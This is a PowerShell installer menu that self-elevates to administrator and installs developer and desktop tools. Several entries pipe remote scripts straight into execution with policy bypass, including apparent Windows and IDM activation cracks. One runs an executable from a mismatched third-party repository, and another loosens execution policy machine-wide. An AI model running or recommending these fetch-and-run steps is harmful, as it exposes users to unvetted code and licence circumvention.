# Tool Installer Menu by Afnan - PowerShell Version
# Converted from tools-installer.cmd - No functionality changed

# Set window title and colors
$Host.UI.RawUI.WindowTitle = "Tool Installer Menu by Afnan"
$Host.UI.RawUI.BackgroundColor = 'Black'
$Host.UI.RawUI.ForegroundColor = 'Green'
Clear-Host

# Resize console buffer/window (optional, matches original commented section)
$Host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(80,3000)
$Host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(80,40)

# ==============================
# ADMIN CHECK
# ==============================
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Requesting administrator privileges..." -ForegroundColor Yellow
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}

# ==============================
# HELPER FUNCTIONS
# ==============================
function Pause {
    Write-Host ""
    Write-Host "Press any key to continue..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

function Show-AsciiHeader {
    Write-Host ""
    Write-Host "                        _    _____ _   _    _    _   _ "
    Write-Host "                       / \  |  ___| \ | |  / \  | \ | |"
    Write-Host "                      / _ \ | |_  |  \| | / _ \ |  \| |"
    Write-Host "                     / ___ \|  _| | |\  |/ ___ \| |\  |"
    Write-Host "                    /_/   \_\_|   |_| \_/_/   \_\_| \_|"
    Write-Host ""
}

# ==============================
# SUB-FUNCTIONS (All Original Labels Converted)
# ==============================

function OPENPORTFOLIO {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Opening Your Browser with Portfolio" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    Start-Process "https://afnan-nex.github.io/portfolio/index.html"
    Pause
}

function SEEPOLICY {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Checking PowerShell Execution Policy" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Current Execution Policy:"
    Get-ExecutionPolicy -List
    Write-Host ""
    Pause
}

function UNRESTRICT {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Setting PowerShell Policy to Unrestricted" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    Set-ExecutionPolicy Unrestricted -Force -Scope CurrentUser
    Set-ExecutionPolicy Unrestricted -Force -Scope LocalMachine -ErrorAction SilentlyContinue
    Write-Host "Policy updated successfully." -ForegroundColor Green
    Write-Host ""
    Pause
}

function CHOCO {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing/Checking Chocolatey" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (Get-Command choco -ErrorAction SilentlyContinue) {
        Write-Host "Chocolatey is already installed." -ForegroundColor Green
        choco --version
    } else {
        Write-Host "Installing Chocolatey..." -ForegroundColor Yellow
        Set-ExecutionPolicy Bypass -Scope Process -Force
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
        Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
        Write-Host "Chocolatey installation completed." -ForegroundColor Green
        Write-Host "Refreshing environment variables..." -ForegroundColor Gray
        # refreshenv is a Chocolatey command, call via cmd
        cmd /c "refreshenv" >$null 2>&1
    }
    Write-Host ""
    Pause
}

function NODELTS {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing Node.js LTS" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
        CHOCO
    }
    if (Get-Command node -ErrorAction SilentlyContinue) {
        Write-Host "Node.js is already installed." -ForegroundColor Green
        node --version
    } else {
        Write-Host "Installing Node.js LTS..." -ForegroundColor Yellow
        choco install nodejs-lts -y
        Write-Host "Refreshing environment variables..." -ForegroundColor Gray
        cmd /c "refreshenv" >$null 2>&1
    }
    Write-Host ""
    Pause
}

function TITUS {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Running Chris Titus Tech Windows Utility" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm 'https://christitus.com/win' | iex`""
    Write-Host ""
    Pause
}

function MASSGRAVE {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Running Microsoft Activation Scripts" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://get.activated.win | iex`""
    Write-Host ""
    Pause
}

function COPORTON {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Running Coporton Tool" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://coporton.com/ias | iex`""
    Pause
}

function IDM {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Downloading with IDM" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"curl -L -O https://github.com/planetshine0000/vc-redist-latest/releases/download/v1.0.1/Download.exe; .\Download.exe`""
    Write-Host ""
    Pause
}

function SPARKLE {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Running Sparkle Tool" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/Parcoil/Sparkle/v2/get.ps1 | iex`""
    Write-Host ""
    Pause
}

function GHGRAB {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Running GHGrab - GitHub Repository Grabber" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "  GHGrab allows you to quickly download files/folders from GitHub repos." -ForegroundColor Gray
    Write-Host "  Example usage: npx @ghgrab/ghgrab https://github.com/user/repo/path" -ForegroundColor Gray
    Write-Host ""
    Write-Host "  Checking for Node.js/npx..." -ForegroundColor Gray

    if (-not (Get-Command npx -ErrorAction SilentlyContinue)) {
        Write-Host ""
        Write-Host "  [!] npx not found. Installing Node.js LTS via Chocolatey..." -ForegroundColor Yellow
        Write-Host ""
        if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
            Write-Host "  Installing Chocolatey first..." -ForegroundColor Gray
            CHOCO
        }
        Write-Host "  Installing Node.js LTS..." -ForegroundColor Gray
        choco install nodejs-lts -y
        Write-Host "  Refreshing environment..." -ForegroundColor Gray
        cmd /c "refreshenv" >$null 2>&1
    }

    Write-Host ""
    Write-Host "  Launching GHGrab..." -ForegroundColor Green
    Write-Host "  ------------------------------------------" -ForegroundColor Gray
    Write-Host ""

    # Run GHGrab interactively
    npx @ghgrab/ghgrab
    Write-Host ""
    Write-Host "Press any key to return..." -ForegroundColor Gray
    Pause
}

function PYTHON {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing Python" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
        CHOCO
    }
    if (Get-Command python -ErrorAction SilentlyContinue) {
        Write-Host "Python is already installed." -ForegroundColor Green
        python --version
    } else {
        Write-Host "Installing Python..." -ForegroundColor Yellow
        choco install python -y
        Write-Host "Refreshing environment variables..." -ForegroundColor Gray
        cmd /c "refreshenv" >$null 2>&1
    }
    Write-Host ""
    Pause
}

function GIT {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing Git" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
        CHOCO
    }
    if (Get-Command git -ErrorAction SilentlyContinue) {
        Write-Host "Git is already installed." -ForegroundColor Green
        git --version
    } else {
        Write-Host "Installing Git..." -ForegroundColor Yellow
        choco install git -y
        Write-Host "Refreshing environment variables..." -ForegroundColor Gray
        cmd /c "refreshenv" >$null 2>&1
    }
    Write-Host ""
    Pause
}

function DOTNET {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing .NET Runtime and SDK" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
        CHOCO
    }
    if (Get-Command dotnet -ErrorAction SilentlyContinue) {
        Write-Host ".NET is already installed." -ForegroundColor Green
        dotnet --version
    } else {
        Write-Host "Installing .NET..." -ForegroundColor Yellow
        choco install dotnet -y
        Write-Host "Refreshing environment variables..." -ForegroundColor Gray
        cmd /c "refreshenv" >$null 2>&1
    }
    Write-Host ""
    Pause
}

function FFMPEG {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing FFmpeg" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
        CHOCO
    }
    if (Get-Command ffmpeg -ErrorAction SilentlyContinue) {
        Write-Host "FFmpeg is already installed." -ForegroundColor Green
        ffmpeg -version 2>$null | Select-String "ffmpeg version"
    } else {
        Write-Host "Installing FFmpeg..." -ForegroundColor Yellow
        choco install ffmpeg -y
        Write-Host "Refreshing environment variables..." -ForegroundColor Gray
        cmd /c "refreshenv" >$null 2>&1
    }
    Write-Host ""
    Pause
}

function SEVENZIP {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing 7-Zip" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
        CHOCO
    }
    if (Get-Command 7z -ErrorAction SilentlyContinue) {
        Write-Host "7-Zip is already installed." -ForegroundColor Green
    } else {
        Write-Host "Installing 7-Zip..." -ForegroundColor Yellow
        choco install 7zip -y
        Write-Host "Refreshing environment variables..." -ForegroundColor Gray
        cmd /c "refreshenv" >$null 2>&1
    }
    Write-Host ""
    Pause
}

function WINDIRSTAT {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing WinDirStat" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
        CHOCO
    }
    Write-Host "Installing WinDirStat..." -ForegroundColor Yellow
    choco install windirstat -y
    Write-Host ""
    Pause
}

function YTDLP {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing yt-dlp" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
        CHOCO
    }
    Write-Host "Installing yt-dlp..." -ForegroundColor Yellow
    choco install yt-dlp -y
    Write-Host ""
    Pause
}

function NGROK {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing ngrok" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
        CHOCO
    }
    Write-Host "Installing ngrok..." -ForegroundColor Yellow
    choco install ngrok -y
    Write-Host ""
    Pause
}

function N8N {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing n8n Workflow Automation" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command npm -ErrorAction SilentlyContinue)) {
        Write-Host "Node.js is required. Installing Node.js first..." -ForegroundColor Yellow
        NODELTS
        Write-Host "Refreshing PATH environment variable..." -ForegroundColor Gray
        $env:PATH += ";$env:ProgramFiles\nodejs"
    }
    Write-Host "Opening new PowerShell window to install n8n..." -ForegroundColor Yellow
    Start-Process powershell.exe -ArgumentList "-NoExit -Command `"echo 'Installing n8n Workflow Automation...'; npm install -g n8n@latest --verbose; echo 'n8n installation completed.'; echo 'Setting NODES_EXCLUDE environment variable...'; [Environment]::SetEnvironmentVariable('NODES_EXCLUDE','[]','User'); [Environment]::SetEnvironmentVariable('NODES_EXCLUDE','[]','Machine'); echo 'Environment variables set successfully. Press any key to close this window.'; Read-Host`""
    Write-Host ""
    Pause
}

function GWS {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing Google Workspace CLI (GWS)" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command npm -ErrorAction SilentlyContinue)) {
        Write-Host "Node.js is required. Installing Node.js first..." -ForegroundColor Yellow
        NODELTS
        Write-Host "Refreshing PATH environment variable..." -ForegroundColor Gray
        $env:PATH += ";$env:ProgramFiles\nodejs"
    }
    Write-Host "Opening new PowerShell window to install Google Workspace CLI..." -ForegroundColor Yellow
    Start-Process powershell.exe -ArgumentList "-NoExit -Command `"echo 'Installing Google Workspace CLI...'; npm install -g '@googleworkspace/cli'; echo 'Installation completed. Press any key to close this window.'; Read-Host`""
    Write-Host ""
    Pause
}

function GEMINI {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing Google AI CLI (Official CLI)" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command npm -ErrorAction SilentlyContinue)) {
        Write-Host "Node.js is required. Installing Node.js first..." -ForegroundColor Yellow
        NODELTS
        Write-Host "Refreshing PATH environment variable..." -ForegroundColor Gray
        $env:PATH += ";$env:ProgramFiles\nodejs"
    }
    Write-Host "Opening new PowerShell window to install Google AI CLI..." -ForegroundColor Yellow
    Start-Process powershell.exe -ArgumentList "-NoExit -Command `"echo 'Installing Google AI CLI...'; npm install -g '@google/gemini-cli@latest' --verbose; echo 'Installation completed. Press any key to close this window.'; Read-Host`""
    Write-Host ""
    Pause
}

function QWEN {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing Qwen AI" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command npm -ErrorAction SilentlyContinue)) {
        Write-Host "Node.js is required. Installing Node.js first..." -ForegroundColor Yellow
        NODELTS
        Write-Host "Refreshing PATH environment variable..." -ForegroundColor Gray
        $env:PATH += ";$env:ProgramFiles\nodejs"
    }
    Write-Host "Opening new PowerShell window to install Qwen AI CLI..." -ForegroundColor Yellow
    Start-Process powershell.exe -ArgumentList "-NoExit -Command `"echo 'Installing Qwen AI CLI...'; npm install -g '@qwen-code/qwen-code@latest' --verbose; echo 'Installation completed. If failed, visit: https://github.com/QwenLM/Qwen'; echo 'Press any key to close this window.'; Read-Host`""
    Write-Host ""
    Pause
}

function WIN11MENU {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Switching to Windows 11 New Context Menu" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    cmd /c "reg delete HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2} /f && taskkill /f /im explorer.exe && start explorer.exe"
    Pause
}

function WIN10MENU {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Switching to Windows 10 Classic Context Menu" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    cmd /c "reg add HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32 /f /ve && taskkill /f /im explorer.exe && start explorer.exe"
    Pause
}

function WINGET {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing Windows Package Manager (Winget)" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (Get-Command winget -ErrorAction SilentlyContinue) {
        Write-Host "Winget is already installed." -ForegroundColor Green
        winget --version
    } else {
        Write-Host "Installing Winget..." -ForegroundColor Yellow
        try {
            $progressPreference = 'silentlyContinue'
            Invoke-WebRequest -Uri 'https://aka.ms/getwinget' -OutFile 'winget.msixbundle'
            Add-AppxPackage 'winget.msixbundle'
            Remove-Item 'winget.msixbundle' -Force
            Write-Host "Winget installed successfully." -ForegroundColor Green
        } catch {
            Write-Host "Error installing Winget: $($_.Exception.Message)" -ForegroundColor Red
            Write-Host "You may need to install from Microsoft Store instead." -ForegroundColor Gray
        }
    }
    Write-Host ""
    Pause
}

function OFFICE365 {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing Office 365 ProPlus" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command curl -ErrorAction SilentlyContinue)) {
        Write-Host "Curl is required but not found. Please update Windows." -ForegroundColor Red
        Pause
        return
    }

    Write-Host "Downloading Office 365 Setup..." -ForegroundColor Yellow
    $officeUrl = "https://c2rsetup.officeapps.live.com/c2r/download.aspx?ProductreleaseID=O365ProPlusRetail&platform=x64&language=en-us&version=O16GA"
    $officePath = "$env:TEMP\OfficeSetup.exe"
    Invoke-WebRequest -Uri $officeUrl -OutFile $officePath

    if (Test-Path $officePath) {
        Write-Host "Launching Office Installer..." -ForegroundColor Green
        Write-Host "NOTE: The installation will continue in the background." -ForegroundColor Gray
        Start-Process $officePath
    } else {
        Write-Host "Failed to download Office Setup." -ForegroundColor Red
    }
    Write-Host ""
    Pause
}

function EVERYTHING {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing Everything Search Engine" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
        CHOCO
    }
    if (Get-Command everything -ErrorAction SilentlyContinue) {
        Write-Host "Everything is already installed." -ForegroundColor Green
    } else {
        Write-Host "Installing Everything..." -ForegroundColor Yellow
        choco install everything -y
    }
    Write-Host ""
    Pause
}

function CHROME {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing Google Chrome" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
        CHOCO
    }
    if (Get-Command chrome -ErrorAction SilentlyContinue) {
        Write-Host "Google Chrome is already installed." -ForegroundColor Green
    } else {
        Write-Host "Installing Google Chrome..." -ForegroundColor Yellow
        choco install googlechrome -y
    }
    Write-Host ""
    Pause
}

function ZEN {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing Zen Browser (Manual Method)" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command curl -ErrorAction SilentlyContinue)) {
        Write-Host "Curl is required but not found." -ForegroundColor Red
        Pause
        return
    }

    Write-Host "Downloading Zen Browser installer..." -ForegroundColor Yellow
    $zenUrl = "https://github.com/zen-browser/desktop/releases/latest/download/zen.installer.exe"
    $zenPath = "$env:TEMP\zen-installer.exe"
    Invoke-WebRequest -Uri $zenUrl -OutFile $zenPath

    if (Test-Path $zenPath) {
        Write-Host "Running installer..." -ForegroundColor Green
        Start-Process -Wait $zenPath
        Remove-Item $zenPath -Force
    } else {
        Write-Host "Download failed. Opening manual download page..." -ForegroundColor Red
        Start-Process "https://zen-browser.app/download"
    }
    Write-Host ""
    Pause
}

function CUR {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Cloning Elegant Repository from GitHub" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
        Write-Host "Git is required. Installing Git first..." -ForegroundColor Yellow
        GIT
    }
    Write-Host "Cloning repository..." -ForegroundColor Yellow
    git clone https://github.com/afnan-nex/Elegant
    if ($LASTEXITCODE -eq 0) {
        Write-Host "Repository cloned successfully to Elegant folder." -ForegroundColor Green
    } else {
        Write-Host "Failed to clone repository. Please check your internet connection or Git installation." -ForegroundColor Red
    }
    Write-Host ""
    Pause
}

function CMD0A {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Changing CMD color to 0a" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    try {
        Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/afnan-nex/my-fav-scripts/main/cmd-clr-to-0a.cmd' -OutFile 'cmd-clr-to-0a.cmd'
        Start-Process 'cmd-clr-to-0a.cmd'
        Write-Host "CMD color script downloaded and executed." -ForegroundColor Green
    } catch {
        Write-Host "Error downloading script: $($_.Exception.Message)" -ForegroundColor Red
    }
    Write-Host ""
    Pause
}

function OBS {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing OBS Studio" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
        CHOCO
    }
    if (Get-Command obs64 -ErrorAction SilentlyContinue) {
        Write-Host "OBS Studio is already installed." -ForegroundColor Green
    } else {
        Write-Host "Installing OBS Studio..." -ForegroundColor Yellow
        choco install obs-studio -y
    }
    Write-Host ""
    Pause
}

function RUSTDESK {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing RustDesk" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
        CHOCO
    }
    Write-Host "Installing RustDesk..." -ForegroundColor Yellow
    choco install rustdesk -y
    if ($LASTEXITCODE -ne 0) {
        Write-Host "RustDesk installation failed." -ForegroundColor Red
    }
    Write-Host ""
    Pause
}

function HIBIT {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing HiBit Uninstaller" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command curl -ErrorAction SilentlyContinue)) {
        Write-Host "Curl is required but not found." -ForegroundColor Red
        Pause
        return
    }

    Write-Host "Downloading HiBit Uninstaller..." -ForegroundColor Yellow
    $hibitUrl = "https://www.hibitsoft.ir/HiBitUninstaller/HiBitUninstaller-setup-4.0.10.exe"
    $hibitPath = "$env:TEMP\HiBitSetup.exe"
    Invoke-WebRequest -Uri $hibitUrl -OutFile $hibitPath

    if (Test-Path $hibitPath) {
        Write-Host "Running installer..." -ForegroundColor Green
        Start-Process -Wait $hibitPath
        Write-Host "Cleaning up..." -ForegroundColor Gray
        Remove-Item $hibitPath -Force
    } else {
        Write-Host "Failed to download HiBit Uninstaller." -ForegroundColor Red
    }
    Write-Host ""
    Pause
}

function SCRCPY {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing Scrcpy GUI" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command curl -ErrorAction SilentlyContinue)) {
        Write-Host "Curl is required but not found." -ForegroundColor Red
        Pause
        return
    }

    Write-Host "Downloading Scrcpy GUI..." -ForegroundColor Yellow
    $scrcpyUrl = "https://github.com/pizi-0/flutter-scrcpygui/releases/download/1.4.18/scrcpygui-1.4.18-win.exe"
    $scrcpyPath = "$env:TEMP\ScrcpyGUI_Setup.exe"
    Invoke-WebRequest -Uri $scrcpyUrl -OutFile $scrcpyPath

    if (Test-Path $scrcpyPath) {
        Write-Host "Running installer..." -ForegroundColor Green
        Start-Process -Wait $scrcpyPath
        Write-Host "Cleaning up..." -ForegroundColor Gray
        Remove-Item $scrcpyPath -Force
    } else {
        Write-Host "Failed to download Scrcpy GUI." -ForegroundColor Red
    }
    Write-Host ""
    Pause
}

function LOCALSEND {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing LocalSend" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
        CHOCO
    }
    Write-Host "Installing LocalSend..." -ForegroundColor Yellow
    choco install localsend -y
    if ($LASTEXITCODE -ne 0) {
        Write-Host "LocalSend installation failed." -ForegroundColor Red
    }
    Write-Host ""
    Pause
}

function NOTEPADPP {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing Notepad++" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
        CHOCO
    }
    Write-Host "Installing Notepad++..." -ForegroundColor Yellow
    choco install notepadplusplus -y
    if ($LASTEXITCODE -ne 0) {
        Write-Host "Notepad++ installation failed." -ForegroundColor Red
    }
    Write-Host ""
    Pause
}

function SHAREX {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing ShareX" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
        CHOCO
    }
    Write-Host "Installing ShareX..." -ForegroundColor Yellow
    choco install sharex -y
    if ($LASTEXITCODE -ne 0) {
        Write-Host "ShareX installation failed." -ForegroundColor Red
    }
    Write-Host ""
    Pause
}

function VCREDIST {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing Visual C++ Runtimes" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    if (-not (Get-Command curl -ErrorAction SilentlyContinue)) {
        Write-Host "Curl is required but not found." -ForegroundColor Red
        Pause
        return
    }

    $zipUrl = "https://github.com/planetshine0000/vc-redist-latest/releases/download/v1.0.0/Visual-C-Runtimes-All-in-One-Dec-2025.zip"
    $zipFile = "$env:TEMP\VC_Runtimes.zip"
    $extractDir = "$env:TEMP\VC_Runtimes_Temp"

    Write-Host "Downloading Visual C++ Runtimes..." -ForegroundColor Yellow
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile

    if (Test-Path $zipFile) {
        Write-Host "Extracting files..." -ForegroundColor Gray
        if (-not (Test-Path $extractDir)) { New-Item -ItemType Directory -Path $extractDir | Out-Null }
        Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force

        Write-Host "Running install_all.bat as Administrator..." -ForegroundColor Yellow
        $installBat = Get-ChildItem -Recurse -Filter "install_all.bat" -Path $extractDir | Select-Object -First 1
        if ($installBat) {
            Start-Process -FilePath $installBat.FullName -Verb RunAs
        }
        
        Write-Host "Cleaning up ZIP file..." -ForegroundColor Gray
        Remove-Item $zipFile -Force
        Write-Host "Note: The temporary extraction folder was left intact because the installer runs separately." -ForegroundColor Gray
    } else {
        Write-Host "Failed to download Visual C++ Runtimes." -ForegroundColor Red
    }
    Write-Host ""
    Pause
}

function DIRECTX {
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "Installing DirectX Runtime" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan

    # 1. Check for Curl
    if (-not (Get-Command curl -ErrorAction SilentlyContinue)) {
        Write-Host "[ERROR] Curl is required but not found." -ForegroundColor Red
        Pause
        return
    }

    # 2. Setup Directories
    $tempDir = "$env:TEMP\DirectX_Install"
    if (-not (Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir -Force | Out-Null }

    $dxUrl = "https://github.com/planetshine0000/direct-x/releases/download/v1.0.0/DirectX-Redist-Jun-2010.zip"
    $dxZip = "$tempDir\DirectX.zip"

    # 3. Download
    if (-not (Test-Path $dxZip)) {
        Write-Host "Downloading DirectX..." -ForegroundColor Yellow
        Invoke-WebRequest -Uri $dxUrl -OutFile $dxZip
    } else {
        Write-Host "DirectX zip already exists, skipping download." -ForegroundColor Gray
    }

    # 4. Unblock and Extract
    Write-Host "Preparing files..." -ForegroundColor Gray
    Unblock-File -Path $dxZip -ErrorAction SilentlyContinue
    Expand-Archive -Path $dxZip -DestinationPath $tempDir -Force

    # 5. Locate DXSETUP.exe
    Write-Host "Locating DXSETUP.exe..." -ForegroundColor Gray
    $dxSetup = Get-ChildItem -Recurse -Filter "DXSETUP.exe" -Path $tempDir | Select-Object -First 1

    if (-not $dxSetup) {
        Write-Host "[ERROR] DXSETUP.exe not found in extracted files." -ForegroundColor Red
        Pause
        return
    }

    # 6. Run as Admin
    Write-Host "Found DXSETUP at: $($dxSetup.FullName)" -ForegroundColor Green
    Write-Host "Launching installer..." -ForegroundColor Yellow
    Start-Process -FilePath $dxSetup.FullName -Verb RunAs

    # 7. Timer and Cleanup
    Write-Host ""
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "The installer has been launched." -ForegroundColor Green
    Write-Host "Waiting 30 seconds before deleting temporary files..." -ForegroundColor Gray
    Write-Host "==========================================" -ForegroundColor Cyan
    Start-Sleep -Seconds 30

    Write-Host ""
